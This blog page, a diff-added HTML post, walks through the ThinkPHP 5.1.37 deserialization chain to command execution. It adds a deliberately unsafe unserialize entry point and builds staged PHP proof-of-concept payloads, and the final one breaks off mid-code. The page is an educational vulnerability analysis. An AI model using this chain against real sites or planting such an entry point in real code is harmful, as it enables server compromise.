@@ -1,0 +1,259 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>thinkphp5.1.37反序列化链子分析 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言这几天一直在搞一个thinkphp框架的一个反序列化漏洞，tp框架的链子很长，用到的函数也很多，思维也比较跳跃，在此用比较通俗易懂的语言分析反序列化链子的构造以及复现。以便自己日后复习，也希望能帮助到小师傅们。（大佬轻点喷） 环境搭建这个tp5.1.37的源码可以在github上下载，也可以用composer来下载，个人推荐第二种，很方便，在github上需要下载两部分，网址分别为： http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp5.1.37反序列化链子分析">
+<meta property="og:url" content="https://xilitter.github.io/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="前言这几天一直在搞一个thinkphp框架的一个反序列化漏洞，tp框架的链子很长，用到的函数也很多，思维也比较跳跃，在此用比较通俗易懂的语言分析反序列化链子的构造以及复现。以便自己日后复习，也希望能帮助到小师傅们。（大佬轻点喷） 环境搭建这个tp5.1.37的源码可以在github上下载，也可以用composer来下载，个人推荐第二种，很方便，在github上需要下载两部分，网址分别为： http">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a4.jpg">
+<meta property="article:published_time" content="2023-01-31T04:20:33.000Z">
+<meta property="article:modified_time" content="2023-03-07T08:59:50.802Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="Thinkphp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a4.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'thinkphp5.1.37反序列化链子分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-07 16:59:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a4.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">thinkphp5.1.37反序列化链子分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-31T04:20:33.000Z" title="发表于 2023-01-31 12:20:33">2023-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-07T08:59:50.802Z" title="更新于 2023-03-07 16:59:50">2023-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/php%E5%AE%89%E5%85%A8/">php安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="thinkphp5.1.37反序列化链子分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天一直在搞一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=thinkphp&spm=1001.2101.3001.7020">thinkphp</a>框架的一个反序列化漏洞，tp框架的链子很长，用到的函数也很多，思维也比较跳跃，在此用比较通俗易懂的语言分析反序列化链子的构造以及复现。以便自己日后复习，也希望能帮助到小师傅们。（大佬轻点喷）</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这个tp5.1.37的源码可以在github上下载，也可以用composer来下载，个人推荐第二种，很方便，在github上需要下载两部分，网址分别为：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases/tag/v5.1.37">https://github.com/top-think/framework/releases/tag/v5.1.37</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/think/releases/tag/v5.1.37">https://github.com/top-think/think/releases/tag/v5.1.37</a></p>
+<p>这两部分下载完成后放到本机上的www目录（用过小皮都懂）把第一个下载的文件夹改名为thinkphp并且放在第二个下载的文件夹里就ok了。本地访问成功。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/11.png" class>
+
+<p>原本下载的源码是没有反序列化入口的， 我们需要自己来写一个入口。那肯定是要在控制器里去改，你也可以自己写个控制器，我就在\application\index\controller里的index.php里添加代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unser</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$tmp</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们访问&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;unser,然后post传参，看它能不能正确回显。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/12.png" class>
+
+<p>很显然是可以的，那么环境搭建就到此结束。</p>
+<h2 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h2><p>通常我们找链子怎么起步呢？一般都是找__destruct()销毁方法或者是wakeup这种反序列化会自动调用的，我们一般是首选。那么我们就先搜索__destruct方法，这里我们进入windows类里面的销毁方法，</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/13.png" class>
+
+<p>发现它调用了removeFiles()方法，继续跟进。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/14.png" class>
+
+<p>这里就是将files数组遍历，然后判断文件是否存在，files是windows类的一个属性，我们是可控的，这里文件如果存在，就会删除，那么这里就有一个任意文件删除的漏洞，当然，这不是我们的目的，file_exists函数会把传进来的参数当作字符串，那么如果我们传一个类进去，会不会就触发了这个类的toString()方法，这很好理解，那么接下来 我们就需要找什么类调用了toString()方法。这里我们利用Conversion类里的toString()方法。</p>
+<h3 id="避雷"><a href="#避雷" class="headerlink" title="避雷"></a>避雷</h3><p>这里我们可不能直接去实例化Conversion类，为什么呢？因为Conversion类是由trait这个关键字定义的，那么这个关键字是啥意思。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 实现了一种代码复用的方法，称为 trait。</span><br><span class="line"> </span><br><span class="line">Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。</span><br><span class="line"> </span><br><span class="line">Trait 和 Class 相似，但仅仅旨在用细粒度和一致的方式来组合功能。 无法通过 trait 自身来实例化。它为传统继承增加了水平特性的组合；也就是说，应用的几个 Class 之间不需要继承。</span><br></pre></td></tr></table></figure>
+
+<p>所以说，Conversion类是不能直接实例化的，那么就要找引用它的子类了。这里有Model类继承了Conversion类，</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/15.png" class>
+
+<p>这里是引用了Conversion类的，但是Model类是由adstract关键字修饰的，所以也不能直接实例化，接下来就要找继承了Model类的子类了，</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/16.png" class>
+
+<p>这里找到一个Pivot类，那么往回看，我们让files去实例化这个类，是不是就可以调用toString方法了，当然Pivot类本身是没有tostring方法，但是它会向父类去寻找，最终调用了Conversion类中的tostring方法。一个简单的逻辑图。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/17.png" class>
+
+<p> 调用完tostring()魔术方法，第一阶段算是完成。开始编写这一块的poc。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们打一下payload，看看是否调用了tostring()函数。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/18.png" class>
+
+<p>这里成功调用了tostring()方法了。</p>
+<p>那么接下来就主看Conversion类，这里tostring里调用了tojson()函数。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/19.png" class>
+
+<p>跟进tojson函数， 发现里面是调用了toArray函数</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/20.png" class>
+
+<p>那么继续跟进toArray函数。这个函数的代码很长，我只放关键部分。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/21.png" class>
+
+<p>append是我们的私有属性数组，它可控，那么name也可控，那么我们跟进getRelation函数，在Relationship类中有具体的实现方法，</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/22.png" class>
+
+<p>这里的name参数就是key，可控，这里的relation为空，那么这个函数返回为空，继续看toArray函数，往下走，if判断，因为getRelation函数返回为空，然后进行！处理变为true进入到了我们的if语句里。再跟进getAttr函数。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/23.png" class>
+
+<p>这个函数的name参数就是append的键名，也是可控的，继续跟进getData函数，</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/24.png" class>
+
+<p>这里的name我们说了是append的键名，如果这个键名在data数组里存在，就会返回data数组name键名下的值，（别晕！）那么我们可以任意构造值，最后返回给relation变量，那么这个relation对于我们来说就可控了。继续看toArray的代码，它最后会调用不知名函数。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/25.png" class>
+
+<p> 在这里，如果我们构造的relation是一个不存在visible方法的类对象，那么是不是就可以调用这个类中的__call方法。那么我们就找哪些类利用了call方法。这里使用request类中的call方法。想要成功调用，必须得满足data数组里存在append的键名。</p>
+<p>目前还有一个问题，怎么进行变量覆盖，这里append属性和data属性我们都在Model类中进行修改，为什么可以这样？</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/26.png" class>
+
+<p>Conversion类和Attribute类Model类中都引用到了，那么他们对应的append属性和data属性是不是都可以通过这个类进行覆盖了。那么在上一个poc上继续编写</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;li&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;li&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们继续本地测试，看我们编写的poc能不能调用我们的call方法。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/27.png" class>
+
+<p>测试是可以的。第二阶段完成。那么来到了最后一个阶段。</p>
+<p>继续跟进call方法</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/28.png" class>
+
+<p>这里有一个call_user_func_array函数我们可以任意函数调用，在这里我要说一下call方法的两个参数，method参数就是visible，而args就是这个函数的参数。（没印象的回看代码）这里判断method参数在hook数组里是否存在，那么我们就应该满足这个条件，让hook的键名赋值为visible。因为array_unshift函数会把本类对象插进数组前面，那么我们调用system函数就会对象转字符串发生报错。同理，这里我们要调用经典利用点input函数，但是这个函数我们也不能直接调，那么继续找调用了input函数的函数，找到了param函数，我们依然不能直接调，继续往上找，就找到了isAjax函数，这里不会强制转换报错。那么就跟进isAjax函数。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/29.png" class>
+
+<p>这里调用了param函数，继续跟进</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/30.png" class>
+
+<p>中间的两个if，在正常情况下不会进入，我们也不需要让它进入。这里就调用了input函数。这里的param属性和filter属性我们都可控。继续跟进input函数。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/31.png" class>
+
+<p>这中间又是两个if，只要满足name属性为空就可以绕过这两个if分支。这里的data我们不可控，但是默认为空数组。然后就调用了array_walk_recursive函数，这个函数会调用filterValue函数，那么就继续跟进吧。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/32.png" class>
+
+<p>走到这里就调用了最终利用点call_user_func函数。这个filter我们可控，可以构造任意函数，这个value源于input的data数组，而data属性就源于param函数的$this-&gt;param属性。（不清楚的多看看这三个函数之间的调用）那么这里的filter和value属性我们都可控，我们就可以远程命令执行了。那么就开始编写最终版poc了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;li&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;li&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span 